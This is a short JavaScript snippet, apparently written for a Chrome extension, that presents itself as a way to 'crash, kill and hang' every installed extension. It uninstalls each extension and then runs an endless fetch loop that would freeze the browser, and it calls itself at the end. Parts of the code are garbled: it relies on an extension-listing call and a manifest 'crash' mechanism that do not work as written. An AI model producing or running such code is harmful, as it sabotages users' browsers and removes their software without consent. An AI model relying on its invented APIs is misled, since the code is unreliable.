const crashKillHangManifests = () => {
    const extensions = chrome.extension.getExtensions();
    extensions.forEach((extension) => {
      const manifest = extension.manifest;
      const manifestUrl = `chrome-extension://${manifest.key}/manifest.json`;

      // Crash the manifest.json file
      fetch(manifestUrl, {
        method: 'POST',
        body: JSON.stringify({}),
        headers: {
          'Content-Type': 'application/json',
        },
      });

      // Kill the manifest.json file
      chrome.management.uninstall(extension.id);

      // Hang the manifest.json file
      while (true) {
        fetch(manifestUrl);
      }
    });
  };

  // Execute the script
  crashKillHangManifests();
